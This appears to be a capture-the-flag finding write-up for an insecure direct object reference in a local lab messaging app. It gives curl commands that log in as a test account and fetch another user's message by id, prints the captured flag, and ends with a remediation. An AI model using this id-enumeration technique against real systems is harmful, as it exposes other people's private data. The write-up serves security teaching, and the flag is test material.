# Other People's Mail — Insecure Direct Object Reference (IDOR)
- Endpoint: GET /messages/<id>
- Severity: High
- Flag: FLAG{idor_6821ab88dc33}
## Request / payload / command
```
# log in as the public account alice / password123
curl -s -i -c alice.txt --data "username=alice" --data "password=password123" \
  http://127.0.0.1:5000/login
# alice only owns #4 and #5, but request someone else's message by number:
curl -s -b alice.txt http://127.0.0.1:5000/messages/1
```
## What happened
`/messages` lists only alice's own messages (#4, #5), but `/messages/<id>` fetches
a message purely by the numeric id in the URL with no check that the message
belongs to the logged-in user. Enumerating ids 1-3 returned messages addressed to
other users. Message #1 ("Onboarding secret", To: admin) was readable by alice and
contained the flag.
Discovery: logged in as alice (3 attempts to enumerate ids 1,2,3; id 1 hit).
## Evidence
```
# GET /messages/1 as alice:
<h1>#1 — Onboarding secret</h1>
<p class="meta">To: admin</p>
<p>Internal only. Do not share. FLAG{idor_6821ab88dc33}</p>
```
## Remediation
Enforce an ownership/authorization check on every object access, e.g.
`WHERE id = ? AND recipient = current_user`, returning 403/404 otherwise.
